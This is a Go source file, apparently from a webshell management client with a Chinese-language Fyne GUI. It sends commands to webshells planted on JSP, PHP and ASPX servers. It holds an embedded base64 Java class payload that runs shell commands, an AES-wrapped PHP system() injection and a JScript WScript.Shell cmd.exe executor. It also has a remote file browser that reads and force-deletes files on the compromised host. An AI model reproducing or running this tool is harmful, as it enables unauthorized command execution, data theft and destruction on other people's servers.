package main

import (
	"bytes"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"net/http"
	neturl "net/url"
	"os"
	"sort"
	"strconv"
	"strings"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/flopp/go-findfont"
)

func init() {
	// 设置中文字体
	fontPaths := findfont.List()
	for _, path := range fontPaths {
		if strings.Contains(path, "msyh.ttf") || strings.Contains(path, "simhei.ttf") || strings.Contains(path, "simsun.ttc") || strings.Contains(path, "simkai.ttf") {
			os.Setenv("FYNE_FONT", path)
			break
		}
	}
}

func executeCommand4(connURL, command string) (string, error) {
	var fullURL string
	fmt.Println(connType)
	fmt.Println(1)
	if connType == "JSP+" {
		Encommand := base64Encode(command)

		if connType == "JSP+" {
			fullURL = fmt.Sprintf("%s?Enco=base64&C1=L2Jpbi9zaA==&C2=%s", connURL, Encommand)
		}
		fmt.Printf("fullURL: %s\n", fullURL)

		fmt.Printf("password1: %s\n", password1)
		data := neturl.Values{}
		data.Set(password1, "yv66vgAAADcBKwoAQAB4CQBbAHkJAFsAegcAewoABAB8BwB9CgAEAH4HAH8KAEAAgAgAXAoAPQCBCgCCAIMKAIIAhAgAXgcAhQoADwCGCACHCwAGAIgIAIkJAFsAiggAiwgAjAkAWwCNBwCOCgAYAI8IAJALAAgAkQsABgCSCwAIAJIIAJMSAAAAlwoAWwCYCgBbAJkIAJoKAFsAmwoAGACcCgAYAJ0LAAgAngoAnwCgCgAPAJ0SAAEAlwgAogoALACjBwCkCgAsAKUKACwApggApwoALACoBwCpCgAsAKoKADEAqwoALACsCgAsAK0SAAIArwoAMQCwCgAxALEIALIIALMKAD0AtAgAtQcAtgoAPQC3CgA9ALgHALkKALoAuwcAvAcAvQgAvggAvwgAbQoAWwDACADBCADCCgDDAMQKAMMAxQoAxgDHCgBbAMgKAMYAyQgAygoAywDMCgAsAM0IAM4KACwAzwcA0AcA0QoAVQDSCgBUANMKAFQA1BIAAwCXCgBUANYHAG4BAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEADVN0YWNrTWFwVGFibGUBAAJFQwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEABmRlY29kZQEAEkV4ZWN1dGVDb21tYW5kQ29kZQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7BwDXAQAFaXNXaW4BAAMoKVoBAA9Db3B5SW5wdXRTdHJlYW0BADAoTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7KVYHANgBAApTb3VyY2VGaWxlAQAXRXhlY3V0ZUNvbW1hbmRDb2RlLmphdmEMAGMAZAwAXABdDABeAF8BAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwA2QDaAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwA2wDcAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAN0A3gwA3wDgBwDhDADiAOMMAOQA5QEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOYAZAEABEVuY28MAOcAawEAAAwAYABhAQAHY2hhcnNldAEABVVURi04DABiAGEBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDABjAOgBAAl0ZXh0L2h0bWwMAOkA6AwA6gDoAQACQzEBABBCb290c3RyYXBNZXRob2RzDwYA6wgA7AwA7QBrDABtAGsMAGoAawEAAkMyDABuAG8MAO4A7wwA8ADxDADyAPMHAPQMAPUA6AgA9gEAA2hleAwAZwBoAQAQamF2YS9sYW5nL1N0cmluZwwA9wD4DABjAPkBABAwMTIzNDU2Nzg5QUJDREVGDAD6APEBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwA+wD8DABjAP0MAP4A/wwBAAEBCAECDADtAQMMAQQA/QwA8ABrAQAGYmFzZTY0AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwBBQEGAQAMZGVjb2RlQnVmZmVyAQAPamF2YS9sYW5nL0NsYXNzDAEHAQgMAQkBCgEAEGphdmEvbGFuZy9PYmplY3QHAQsMAQwBDQEAAltCAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgwAcQByAQACLWMBAAIvYwcBDgwBDwEQDAERARIHARMMARQBFQwAcwB0DAEWARUBAAdvcy5uYW1lBwEXDAEYAGsMARkA8QEAA3dpbgwBGgEbAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAGMBHAwAYwEdDAEeAPEIAR8MASAAZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAKZ2V0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAMZ2V0UGFyYW1ldGVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOc2V0Q29udGVudFR5cGUBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwoBIQEiAQABAQEAF21ha2VDb25jYXRXaXRoQ29uc3RhbnRzAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBAApFUlJPUjovLyABAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b1VwcGVyQ2FzZQEABmxlbmd0aAEAAygpSQEABChJKVYBAAZjaGFyQXQBAAQoSSlDAQAHaW5kZXhPZgEABChJKUkBAAMBASwBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL1N0cmluZzsBAAV3cml0ZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEADmdldEVycm9yU3RyZWFtAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQADAQ0KAQAFY2xvc2UHASMMAO0BJwEAJGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQcBKQEABkxvb2t1cAEADElubmVyQ2xhc3NlcwEAmChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwEqAQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhAFsAQAAAAAQAAQBcAF0AAAABAF4AXwAAAAEAYABhAAAAAQBiAGEAAAAHAAEAYwBkAAEAZQAAAC8AAgABAAAADyq3AAEqAbUAAioBtQADsQAAAAEAZgAAAA4AAwAAAAoABAALAAkADAABAGcAaAABAGUAAALvAAQABgAAAbsrwQAEmQAhK8AABE0qLLYABcAABrUAAiostgAHwAAItQADpwCsK8EABpkAUiorwAAGtQACKrQAArYACRIKtgALTSwEtgAMLCq0AAK2AA3AAAZOLbYACRIOtgALOgQZBAS2AAwqGQQttgANwAAItQADpwBeTSy2ABCnAFYrwQAImQBPKivAAAi1AAMqtAADtgAJEg62AAtNLAS2AAwsKrQAA7YADcAACE4ttgAJEgq2AAs6BBkEBLYADCoZBC22AA3AAAa1AAKnAAhNLLYAECoqtAACEhG5ABICAMYAESq0AAISEbkAEgIApwAFEhO1ABQqKrQAAhIVuQASAgDGABEqtAACEhW5ABICAKcABRIWtQAXuwAYWRITtwAZTbsAGFkSE7cAGU4qtAADEhq5ABsCACq0AAIqtAAXuQAcAgAqtAADKrQAF7kAHQIAKioqtAACEh65ABICALoAHwAAtgAgtgAhOgQqKiq0AAISIrkAEgIAugAfAAC2ACC2ACE6BS0qGQQZBbYAI7YAJFcsLbYAJbYAJFcqtAADuQAmAQAstgAltgAnpwAUOgQtGQS2ACi6ACkAALYAJFcErAADADQAcABzAA8AigDGAMkADwEmAaUBqAAPAAIAZgAAAK4AKwAAABIABwATAAwAFAAXABUAIgAWACwAFwA0ABkAQQAaAEYAGwBSABwAXQAdAGMAHgBwACEAcwAfAHQAIAB4ACEAewAjAIIAJACKACYAlwAnAJwAKACoACkAswAqALkAKwDGAC4AyQAsAMoALQDOADAA8AAxARIAMgEcADMBJgA1ATEANgE+ADcBSwA4AWUAOQF/ADoBjAA7AZUAPAGlAD8BqAA9AaoAPgG5AEAAaQAAAFYACyX3AE0HAA8H9wBNBwAPBFwHAFv/AAEAAgcAWwcAQAACBwBbBwAsXwcAW/8AAQACBwBbBwBAAAIHAFsHACz/AJgABAcAWwcAQAcAGAcAGAABBwAPEAAAAGoAawACAGUAAABDAAQAAgAAAB4qtAAUEiq2ACuZAAUrsLsALFkrtgAtKrQAF7cALrAAAAACAGYAAAAKAAIAAABEAA4ARQBpAAAAAwABDgBsAAAABAABAA8AAABtAGsAAgBlAAABzQAGAAYAAAEVKrQAFBIqtgArmQCFK8YADCsSE7YAK5kABhITsBIvTSu2ADBMuwAxWSu2ADIFbLcAM04SEzoEAzYFFQUrtgAyogBIGQQsKxUFtgA0tgA1B3gsKxUFBGC2ADS2ADWAugA2AAA6BC0sKxUFtgA0tgA1B3gsKxUFBGC2ADS2ADWAtgA3hAUCp/+1LRIWtgA4sCq0ABQSObYAK5kAfAFNEjq4ADtOLRI8BL0APVkDEixTtgA+LbYAPwS9AEBZAytTtgBBwABCTacARE4SRLgAOzoEGQQSRQO9AD22AD4BA70AQLYAQToFGQW2AAkSRgS9AD1ZAxIsU7YAPhkFBL0AQFkDK1O2AEHAAEJNuwAsWSwSFrcALrArsAABAJwAxADHAEMAAgBmAAAAXgAXAAAASQAMAEoAGQBLABwATQAfAE4AJABPADIAUAA2AFEAQgBSAGQAUwCBAFEAhwBVAI4AVgCaAFcAnABZAKIAWgDEAF8AxwBbAMgAXADPAF0A5ABeAQgAYAETAGIAaQAAADoACBkC/wAcAAYHAFsHACwHACwHADEHACwBAAD6AE34AAb/ADgAAwcAWwcALAcAQgABBwBD+wBA+gAKAGwAAAAEAAEADwAAAG4AbwACAGUAAAC3AAQABgAAAEy7ABhZEhO3ABlOBr0ALFkDK1NZBCq2AEeaAAgSSKcABRJJU1kFLFM6BLgAShkEtgBLOgUqGQW2AEwttgBNKhkFtgBOLbYATS22ACWwAAAAAgBmAAAAGgAGAAAAZgAKAGcAKQBoADMAaQA9AGoARwBrAGkAAAA5AAL/ACAABAcAWwcALAcALAcAGAADBwBwBwBwAf8AAQAEBwBbBwAsBwAsBwAYAAQHAHAHAHABBwAsAGwAAAAEAAEADwAAAHEAcgABAGUAAABOAAIAAgAAABgST7gAUEwrtgBRTCsSUrYAU5kABQSsA6wAAAACAGYAAAAWAAUAAABvAAYAcAALAHEAFAByABYAcwBpAAAACAAB/AAWBwAsAAAAcwB0AAIAZQAAAIAABgAFAAAAM7sAVFm7AFVZKyq0ABe3AFa3AFc6BBkEtgBYWU7GABEsLboAWQAAtgAkV6f/6xkEtgBasQAAAAIAZgAAABYABQAAAHgAFQB5AB8AegAtAHwAMgB9AGkAAAAfAAL9ABUABwBU/wAXAAUHAFsHAHUHABgHACwHAFQAAABsAAAABAABAA8AAwB2AAAAAgB3ASYAAAAKAAEBJAEoASUAGQCUAAAAGgAEAJUAAQCWAJUAAQChAJUAAQCuAJUAAQDV")
		encodedData := data.Encode()

		req, err := http.NewRequest("POST", fullURL, strings.NewReader(encodedData))
		if err != nil {
			return "", err
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			return "", err
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return "", err
		}

		fmt.Printf("Response body: %s\n", string(body))

		return string(body), nil
	}
	if connType == "PHP+" {
		command = strings.ReplaceAll(command, `\`, `\\`)
		command = fmt.Sprintf(`hello | system('%s');`, command)
		AESkey, sessionID = PHPEConnection1(connURL, password1)
		encrypted, err := encryptAES128ECB([]byte(command), []byte(AESkey))
		postData := encrypted
		fmt.Printf("run 4 test:%s\n", connURL)
		req, err := http.NewRequest("POST", connURL, bytes.NewBuffer([]byte(postData)))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Cookie", sessionID)
		fmt.Println("Post Data: ", postData)
		client := &http.Client{}
		resp, err := client.Do(req)
		defer resp.Body.Close()

		postRespBody, err := ioutil.ReadAll(resp.Body)

		if err != nil {
		}

		utf8Body, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(postRespBody))
		fmt.Printf("1:%s\n", utf8Body)

		return string(utf8Body), nil

	}
	if connType == "ASPX+" {
		fmt.Println(connURL)
		resp, err := http.Get(connURL + "?pass=" + password1)
		if err != nil {
			fmt.Println(fmt.Sprintf("请求失败: %v", err))
			return "0", nil
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(fmt.Sprintf("读取响应失败: %v", err))
			return "0", nil
		}

		sessionID = resp.Header.Get("Set-Cookie")
		fmt.Printf("sessionID:%s\n", sessionID)
		if sessionID == "" {
			fmt.Println("未能获取会话ID")
			return "0", nil
		}
		AESkey = string(body)
		fmt.Printf("获取到的key为：%s\n", AESkey)

		command = strings.ReplaceAll(command, `\`, `\\`)

		command := fmt.Sprintf(`var shell = new ActiveXObject("WScript.Shell"); var exec = shell.Exec("cmd.exe /c %s"); var output = exec.StdOut.ReadAll();`, command)

		fmt.Println(command)
		fmt.Printf("This is key:%s\n", AESkey)
		key := []byte(AESkey)

		data := []byte(command)

		encrypted, err := encryptAES128ECB(data, key)
		if err != nil {
			fmt.Println("Error:", err)
			return "0", nil
		}

		postRespBody, nil := postEncryptedData(connURL, encrypted, sessionID)

		return string(postRespBody), nil

	}
	return "0", nil
}

func listFiles4(remoteURL, path string) ([]FileItem, error) {
	command := fmt.Sprintf("dir %s", path)
	output, err := executeCommand4(remoteURL, command)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(output, "\n")
	if len(lines) > 7 {
		lines = lines[5 : len(lines)-1]
	}

	var files []FileItem
	for _, line := range lines {
		if line == "" || strings.HasPrefix(line, " 总数") || strings.HasPrefix(line, "               ") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 4 {
			continue
		}
		// 处理DIR命令的输出格式
		isDir := strings.Contains(line, "<DIR>")
		name := strings.Join(fields[3:], " ")
		perms := "N/A"
		size := fields[2] + " B"
		if !isDir {
			sizeValue, _ := strconv.ParseInt(fields[2], 10, 64)
			if sizeValue >= 1024 {
				size = fmt.Sprintf("%.2f KB", float64(sizeValue)/1024)
			}
		}
		date := fmt.Sprintf("%s %s", fields[0], fields[1])
		files = append(files, FileItem{Name: name, IsDir: isDir, Perms: perms, Size: size, Date: date})
	}

	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir == files[j].IsDir {
			return files[i].Name < files[j].Name
		}
		return files[i].IsDir && !files[j].IsDir
	})

	return files, nil
}

func deleteFile4(remoteURL, path string) error {
	var command string
	if strings.HasSuffix(path, "/") || strings.HasSuffix(path, "\\") {
		command = fmt.Sprintf("rmdir /s /q %s", path)
	} else {
		command = fmt.Sprintf("del /f /q %s", path)
	}
	_, err := executeCommand4(remoteURL, command)
	return err
}

func showFileContent4(remoteURL, filePath string) (string, error) {
	command := fmt.Sprintf("type %s", filePath)

	return executeCommand4(remoteURL, command)
}

func RunFileManager4(myWindow fyne.Window, remoteURL string, connType string, password string) {

	password1 = password

	resp, err := http.Get(remoteURL)
	if err != nil {
		fmt.Println("Failed to make GET request:", err)
		return
	}
	defer resp.Body.Close()

	var currentPath = "C:\\"
	var list *widget.List
	var files []FileItem

	fmt.Println("Connection Type:", connType)

	updateList := func() {
		var err error
		files, err = listFiles4(remoteURL, currentPath)
		if err != nil {
			files = []FileItem{{Name: "Error: " + err.Error(), IsDir: false}}
		}
		list.Refresh()
	}

	list = widget.NewList(
		func() int {
			return len(files)
		},
		func() fyne.CanvasObject {
			return container.NewGridWithColumns(7,
				widget.NewIcon(theme.FileIcon()),
				widget.NewLabel("File"),
				widget.NewLabel("Date"),
				widget.NewLabel("Size"),
				widget.NewLabel("Perms"),
				widget.NewButton("打开", nil),
				widget.NewButton("删除", nil),
			)
		},
		func(id widget.ListItemID, item fyne.CanvasObject) {
			file := files[id]
			grid := item.(*fyne.Container)
			icon := grid.Objects[0].(*widget.Icon)
			nameLabel := grid.Objects[1].(*widget.Label)
			dateLabel := grid.Objects[2].(*widget.Label)
			sizeLabel := grid.Objects[3].(*widget.Label)
			permsLabel := grid.Objects[4].(*widget.Label)
			openBtn := grid.Objects[5].(*widget.Button)
			deleteBtn := grid.Objects[6].(*widget.Button)

			nameLabel.SetText(file.Name)
			dateLabel.SetText(file.Date)
			sizeLabel.SetText(file.Size)
			permsLabel.SetText(file.Perms)

			if file.IsDir {
				icon.SetResource(theme.FolderIcon())
				sizeLabel.SetText("")
				dateLabel.SetText("")
				deleteBtn.Hide()
			} else {
				icon.SetResource(theme.FileIcon())
				deleteBtn.Show()
			}

			openBtn.OnTapped = func() {
				if file.IsDir {
					currentPath += file.Name + "\\"
					updateList()
				} else {
					content, err := showFileContent4(remoteURL, currentPath+file.Name)
					if err != nil {
						content = "Error: " + err.Error()
					}

					utf8Body, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(content))

					contentEntry := widget.NewMultiLineEntry()
					contentEntry.SetText(utf8Body)
					scrollContainer := container.NewScroll(contentEntry)
					scrollContainer.SetMinSize(fyne.NewSize(800, 600))
					mainPageButton := widget.NewButton("返回主页", func() {
						myWindow.SetContent(firstPage())
					})

					backButton := widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
						if currentPath != "C:\\" {
							currentPath = currentPath[:strings.LastIndex(currentPath[:len(currentPath)-1], "\\")+1]
							updateList()
						}
					})

					buttonContainer := container.NewVBox(mainPageButton, backButton)

					returnBtn := widget.NewButton("返回", func() {
						myWindow.SetContent(container.NewBorder(buttonContainer, nil, nil, nil, list))
					})

					myWindow.SetContent(container.NewBorder(returnBtn, nil, nil, nil, scrollContainer))
				}
			}

			deleteBtn.OnTapped = func() {
				deleteFile4(remoteURL, currentPath+file.Name)
				updateList()
			}
		},
	)

	backButton := widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
		if currentPath != "C:\\" {
			currentPath = currentPath[:strings.LastIndex(currentPath[:len(currentPath)-1], "\\")+1]
			updateList()
		}
	})

	mainPageButton := widget.NewButton("返回主页", func() {
		myWindow.SetContent(firstPage())
	})

	header := container.NewGridWithColumns(7,
		widget.NewLabelWithStyle("", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件名", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件日期", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件大小", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件权限", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabel(""),
		widget.NewLabel(""),
	)

	initialContent := container.NewBorder(container.NewVBox(mainPageButton, backButton, header), nil, nil, nil, list)

	myWindow.SetContent(initialContent)
	updateList()
}
